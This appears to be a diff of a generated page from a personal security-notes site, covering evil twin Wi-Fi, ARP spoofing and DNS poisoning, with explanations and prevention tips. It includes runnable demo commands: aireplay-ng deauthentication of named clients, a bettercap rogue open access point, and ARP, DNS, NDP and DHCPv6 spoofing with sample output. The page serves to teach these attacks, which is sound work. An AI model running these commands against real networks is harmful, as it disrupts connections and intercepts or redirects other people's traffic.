@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="
@@ -128,39 +128,62 @@ set wifi.ap.channel 5
 set wifi.ap.encryption false
 wifi.recon on; wifi.ap
 
-
-# Fake dns
-sudo bettercap -iface wlo1
-
-# In bettercap:
-net.probe on
-net.show
-
-set arp.spoof.targets 192.168.1.9
-set dns.spoof.domains alo1411.team
-
-arp.spoof on
-# E.g output
-[sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets
-
-dns.spoof on
-# E.g output
-[sys.log] [inf] dns.spoof alo1411.team -&gt; 192.168.1.17
-
-net.sniff
-
-  References
+  ARP spoofing attack
   #
 
 
-Bettercap: WiFi
-">
+ARP: Address Resolution Protocol
+A type of MitM attack
+
+
+  How ARP Works
+  #
+
+
+ARP Basics:
+
+ARP is used to map an IP address to a MAC address within a local network
+When a device wants to communicate with another, it broadcasts an ARP request: &ldquo;Who has IP 192.168.1.1? Tell me your MAC address.&rdquo;
+The device with the corresponding IP replies with its MAC address
+
+
+Normal Communication:
+
+Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses
+
+
+
+
+  How ARP Spoofing Works
+  #
+
+
+The attacker sends forged ARP replies to the victim device and/or the router, claiming:
+
+&ldquo;I am the router (192.168.1.1)&rdquo; to the victim
+&ldquo;I am the victim (192.168.1.100)&rdquo; to the router
+
+
+Both the victim and the router update their ARP tables with the attacker&rsquo;s MAC address for the claimed IP
+As a result:
+
+All traffic from the victim to the router (and vice versa) flows through the attacker
+The attacker becomes a &ldquo;man-in-the-middle&rdquo; (MITM), able to intercept or modify traffic
+
+
+
+
+  Diagram
+  #
+
+Normal Traffic:
+Victim → Router → Internet">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
-<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/research/security/evil_twin/">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://dangpham112000.github.io/docs/research/security/evil_twin/">
   <meta property="og:site_name" content="Dante 0401">
   <meta property="og:title" content="Evil Twin - Draft">
-  <meta property="og:description" content="Evil Twin Attack # A type of MitM attack Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic Key Characteristics: The rogue network often has a similar name to the real network (e.g., “FreeWiFi”) Victims unknowingly connect to the attacker’s network Prevention: Educate users to verify SSIDs before connecting Enable Mutual Authentication on enterprise Wi-Fi setups Demo # DISCLAIMER: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content Disconnect user from wifi # # Install the Aircrack-ng suite, which includes airmon-ng sudo apt install aircrack-ng # Check wireless interface iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. wlo1 IEEE 802.11 ESSID:&#34;A14-01&#34; Mode:Managed Frequency:2.417 GHz Access Point: CC:71:90:62:9E:98 Bit Rate=130 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on Link Quality=62/70 Signal level=-48 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:203 Missed beacon:0 docker0 no wireless extensions. # -&gt; Your wireless interface is wlo1 # Disconnect the wireless adapter from managing a network sudo airmon-ng check kill # Enable monitor mode on your wireless adapter sudo airmon-ng start wlo1 # Verify iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. docker0 no wireless extensions. wlo1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on # -&gt; Your wireless adapter with monitor mode is now wlo1mon # Start capture packets sudo airodump-ng wlo1mon # Find the channel of wifi sudo aireplay-ng --test wlo1mon # E.g output 12:26:19 Trying broadcast probe requests... 12:26:21 No Answer... 12:26:21 Found 4 APs 12:26:21 Trying directed probe requests... 12:26:21 CC:71:90:62:9E:98 - channel: 2 - &#39;A14-01&#39; 12:26:27 0/30: 0% 12:26:27 30:4F:75:8F:7F:28 - channel: 2 - &#39;Dinh Bao&#39; 12:26:33 0/30: 0% 12:26:34 C0:B5:D7:89:36:70 - channel: 8 - &#39;Do Hai&#39; 12:26:40 0/30: 0% 12:26:40 E8:43:68:6A:3B:88 - channel: 3 - &#39;Hoang Linh&#39; 12:26:46 0/30: 0% # -&gt; We will taget &#39;A14-01&#39; wifi, its channel is 2 # Stop the process capturing packets and start capture packets only on channel 2 sudo airodump-ng --channel 2 wlo1mon # Deauthenticate target device from wifi by sending deauth packets sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon # E.g sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon # E.g output 12:24:18 Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2 12:24:18 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs] 12:24:32 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs] 12:24:33 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs] # Or omit to target all devices sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon Stop capturing packets (exit monitor mode) sudo airmon-ng stop wlo1mon sudo systemctl restart NetworkManager Create the rogue access point # sudo apt update sudo apt install bettercap # Rogue access point sudo bettercap -iface wlo1mon # In bettercap: set wifi.ap.ssid Banana set wifi.ap.bssid DE:AD:BE:EF:DE:AD set wifi.ap.channel 5 set wifi.ap.encryption false wifi.recon on; wifi.ap # Fake dns sudo bettercap -iface wlo1 # In bettercap: net.probe on net.show set arp.spoof.targets 192.168.1.9 set dns.spoof.domains alo1411.team arp.spoof on # E.g output [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets dns.spoof on # E.g output [sys.log] [inf] dns.spoof alo1411.team -&gt; 192.168.1.17 net.sniff References # Bettercap: WiFi">
+  <meta property="og:description" content="Evil Twin Attack # A type of MitM attack Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic Key Characteristics: The rogue network often has a similar name to the real network (e.g., “FreeWiFi”) Victims unknowingly connect to the attacker’s network Prevention: Educate users to verify SSIDs before connecting Enable Mutual Authentication on enterprise Wi-Fi setups Demo # DISCLAIMER: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content Disconnect user from wifi # # Install the Aircrack-ng suite, which includes airmon-ng sudo apt install aircrack-ng # Check wireless interface iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. wlo1 IEEE 802.11 ESSID:&#34;A14-01&#34; Mode:Managed Frequency:2.417 GHz Access Point: CC:71:90:62:9E:98 Bit Rate=130 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on Link Quality=62/70 Signal level=-48 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:203 Missed beacon:0 docker0 no wireless extensions. # -&gt; Your wireless interface is wlo1 # Disconnect the wireless adapter from managing a network sudo airmon-ng check kill # Enable monitor mode on your wireless adapter sudo airmon-ng start wlo1 # Verify iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. docker0 no wireless extensions. wlo1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on # -&gt; Your wireless adapter with monitor mode is now wlo1mon # Start capture packets sudo airodump-ng wlo1mon # Find the channel of wifi sudo aireplay-ng --test wlo1mon # E.g output 12:26:19 Trying broadcast probe requests... 12:26:21 No Answer... 12:26:21 Found 4 APs 12:26:21 Trying directed probe requests... 12:26:21 CC:71:90:62:9E:98 - channel: 2 - &#39;A14-01&#39; 12:26:27 0/30: 0% 12:26:27 30:4F:75:8F:7F:28 - channel: 2 - &#39;Dinh Bao&#39; 12:26:33 0/30: 0% 12:26:34 C0:B5:D7:89:36:70 - channel: 8 - &#39;Do Hai&#39; 12:26:40 0/30: 0% 12:26:40 E8:43:68:6A:3B:88 - channel: 3 - &#39;Hoang Linh&#39; 12:26:46 0/30: 0% # -&gt; We will taget &#39;A14-01&#39; wifi, its channel is 2 # Stop the process capturing packets and start capture packets only on channel 2 sudo airodump-ng --channel 2 wlo1mon # Deauthenticate target device from wifi by sending deauth packets sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon # E.g sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon # E.g output 12:24:18 Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2 12:24:18 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs] 12:24:32 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs] 12:24:33 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs] # Or omit to target all devices sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon Stop capturing packets (exit monitor mode) sudo airmon-ng stop wlo1mon sudo systemctl restart NetworkManager Create the rogue access point # sudo apt update sudo apt install bettercap # Rogue access point sudo bettercap -iface wlo1mon # In bettercap: set wifi.ap.ssid Banana set wifi.ap.bssid DE:AD:BE:EF:DE:AD set wifi.ap.channel 5 set wifi.ap.encryption false wifi.recon on; wifi.ap ARP spoofing attack # ARP: Address Resolution Protocol A type of MitM attack How ARP Works # ARP Basics: ARP is used to map an IP address to a MAC address within a local network When a device wants to communicate with another, it broadcasts an ARP request: “Who has IP 192.168.1.1? Tell me your MAC address.” The device with the corresponding IP replies with its MAC address Normal Communication: Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses How ARP Spoofing Works # The attacker sends forged ARP replies to the victim device and/or the router, claiming: “I am the router (192.168.1.1)” to the victim “I am the victim (192.168.1.100)” to the router Both the victim and the router update their ARP tables with the attacker’s MAC address for the claimed IP As a result: All traffic from the victim to the router (and vice versa) flows through the attacker The attacker becomes a “man-in-the-middle” (MITM), able to intercept or modify traffic Diagram # Normal Traffic: Victim → Router → Internet">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="docs">
@@ -169,10 +192,10 @@ Bettercap: WiFi
 <title>Evil Twin - Draft | Dante 0401</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" >
-<link rel="canonical" href="http://localhost:1313/docs/research/security/evil_twin/">
+<link rel="canonical" href="https://dangpham112000.github.io/docs/research/security/evil_twin/">
 <link rel="stylesheet" href="/book.min.0ebfa1e81a7b241abaa8a9626be8325416e98d14702ea33197aea691fec27e9d.css" integrity="sha256-Dr&#43;h6Bp7JBq6qKlia&#43;gyVBbpjRRwLqMxl66mkf7Cfp0=" crossorigin="anonymous">
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.49718a035eca8bb7bfbf8c0b1352a9fd99c2839da0a0ef9a2821a0bedfdb59f4.js" integrity="sha256-SXGKA17Ki7e/v4wLE1Kp/ZnCg52goO&#43;aKCGgvt/bWfQ=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.246d8ad13b434e9c9688f2e0b9300b8b4d2b3c4cb004dc3c3d3bd45535786196.js" integrity="sha256-JG2K0TtDTpyWiPLguTALi00rPEywBNw8PTvUVTV4YZY=" crossorigin="anonymous"></script>
 <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
@@ -730,6 +753,19 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#create-the-rogue-access-point">Create the rogue access point</a></li>
       </ul>
     </li>
+  </ul>
+
+  <ul>
+    <li><a href="#how-arp-works">How ARP Works</a></li>
+    <li><a href="#how-arp-spoofing-works">How ARP Spoofing Works</a></li>
+    <li><a href="#diagram">Diagram</a></li>
+    <li><a href="#prevention">Prevention</a></li>
+    <li><a href="#demo-1">Demo</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#prevention-1">Prevention</a></li>
+    <li><a href="#demo-2">Demo</a></li>
     <li><a href="#references">References</a></li>
   </ul>
 </nav>
@@ -867,8 +903,73 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>set wifi.ap.channel <span style="color:#ae81ff">5</span>
 </span></span><span style="display:flex;"><span>set wifi.ap.encryption false
 </span></span><span style="display:flex;"><span>wifi.recon on; wifi.ap
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
+</span></span></code></pre></div><h1 id="arp-spoofing-attack">
+  ARP spoofing attack
+  <a class="anchor" href="#arp-spoofing-attack">#</a>
+</h1>
+<ul>
+<li>ARP: Address Resolution Protocol</li>
+<li>A type of MitM attack</li>
+</ul>
+<h2 id="how-arp-works">
+  How ARP Works
+  <a class="anchor" href="#how-arp-works">#</a>
+</h2>
+<ul>
+<li>ARP Basics:
+<ul>
+<li>ARP is used to map an IP address to a MAC address within a local network</li>
+<li>When a device wants to communicate with another, it broadcasts an ARP request: &ldquo;Who has IP 192.168.1.1? Tell me your MAC address.&rdquo;</li>
+<li>The device with the corresponding IP replies with its MAC address</li>
+</ul>
+</li>
+<li>Normal Communication:
+<ul>
+<li>Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses</li>
+</ul>
+</li>
+</ul>
+<h2 id="how-arp-spoofing-works">
+  How ARP Spoofing Works
+  <a class="anchor" href="#how-arp-spoofing-works">#</a>
+</h2>
+<ul>
+<li>The attacker sends forged ARP replies to the victim device and/or the router, claiming:
+<ul>
+<li>&ldquo;I am the router (192.168.1.1)&rdquo; to the victim</li>
+<li>&ldquo;I am the victim (192.168.1.100)&rdquo; to the router</li>
+</ul>
+</li>
+<li>Both the victim and the router update their ARP tables with the attacker&rsquo;s MAC address for the claimed IP</li>
+<li>As a result:
+<ul>
+<li>All traffic from the victim to the router (and vice versa) flows through the attacker</li>
+<li>The attacker becomes a &ldquo;man-in-the-middle&rdquo; (MITM), able to intercept or modify traffic</li>
+</ul>
+</li>
+</ul>
+<h2 id="diagram">
+  Diagram
+  <a class="anchor" href="#diagram">#</a>
+</h2>
+<p>Normal Traffic:
+Victim → Router → Internet</p>
+<p>ARP Spoofing:
+Victim → Attacker → Router → Internet</p>
+<h2 id="prevention">
+  Prevention
+  <a class="anchor" href="#prevention">#</a>
+</h2>
+<ul>
+<li>Static ARP Entries: Manually map critical IPs to MAC addresses to prevent changes</li>
+<li>Use Encryption: Secure protocols (e.g., HTTPS, SSH, VPN) ensure data confidentiality even if traffic is intercepted</li>
+<li>Enable Dynamic ARP Inspection (DAI): On managed switches, DAI verifies ARP packets against a trusted database</li>
+</ul>
+<h2 id="demo-1">
+  Demo
+  <a class="anchor" href="#demo-1">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake dns</span>
 </span></span><span style="display:flex;"><span>sudo bettercap -iface wlo1
 </span></span><span style="display:flex;"><span>
@@ -880,7 +981,7 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>set dns.spoof.domains alo1411.team
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>arp.spoof on
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># E.g output</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -&gt; Output</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sys.log<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>inf<span style="color:#f92672">]</span> arp.spoof arp spoofer started, probing <span style="color:#ae81ff">1</span> targets
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>dns.spoof on
@@ -888,6 +989,46 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sys.log<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>inf<span style="color:#f92672">]</span> dns.spoof alo1411.team -&gt; 192.168.1.17
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>net.sniff
+</span></span></code></pre></div><h1 id="dns-poisoning">
+  DNS Poisoning
+  <a class="anchor" href="#dns-poisoning">#</a>
+</h1>
+<ul>
+<li>A type of MitM attack</li>
+</ul>
+<h2 id="prevention-1">
+  Prevention
+  <a class="anchor" href="#prevention-1">#</a>
+</h2>
+<ul>
+<li>Use Secure DNS: Configure DNS servers to use DNSSEC (Domain Name System Security Extensions), which adds cryptographic signatures to DNS records</li>
+<li>Enable HTTPS Everywhere: Even if DNS is poisoned, HTTPS with valid certificates will warn users when a site is untrusted</li>
+<li>Avoid Public Wi-Fi: Public networks are more susceptible to DNS poisoning attacks</li>
+<li>Set Trusted DNS Servers: Use reliable DNS resolvers like Google DNS (8.8.8.8) or Cloudflare (1.1.1.1)</li>
+<li>Monitor and Update Systems: Regularly patch DNS servers and network devices to address vulnerabilities</li>
+<li>Use a VPN: Encrypt traffic, bypassing rogue DNS responses on compromised networks</li>
+</ul>
+<h2 id="demo-2">
+  Demo
+  <a class="anchor" href="#demo-2">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set ndp.spoof.neighbour fe80::53a:d4db:13e9:b774
+</span></span><span style="display:flex;"><span>set ndp.spoof.targets 2001:ee0:4f51:2ed0:295c:1995:43bf:3e1b,2001:ee0:4f51:2ed0:c60d:3bd1:19b6:facb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2001:ee0:4f51:2ed0:ed4b:6d8:6bd0:b97f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set dns.spoof.domains mnptt.io.vn
+</span></span><span style="display:flex;"><span>set dns.spoof.address 192.168.1.17
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set dhcp6.spoof.domains mnptt.io.vn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set arp.spoof.targets a4:34:d9:89:a0:58
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ndp.spoof on
+</span></span><span style="display:flex;"><span>dhcp6.spoof on
+</span></span><span style="display:flex;"><span>dns.spoof on
+</span></span><span style="display:flex;"><span>arp.spoof on
 </span></span></code></pre></div><h2 id="references">
   References
   <a class="anchor" href="#references">#</a>
@@ -942,6 +1083,19 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#create-the-rogue-access-point">Create the rogue access point</a></li>
       </ul>
     </li>
+  </ul>
+
+  <ul>
+    <li><a href="#how-arp-works">How ARP Works</a></li>
+    <li><a href="#how-arp-spoofing-works">How ARP Spoofing Works</a></li>
+    <li><a href="#diagram">Diagram</a></li>
+    <li><a href="#prevention">Prevention</a></li>
+    <li><a href="#demo-1">Demo</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#prevention-1">Prevention</a></li>
+    <li><a href="#demo-2">Demo</a></li>
     <li><a href="#references">References</a></li>
   </ul>
 </nav>
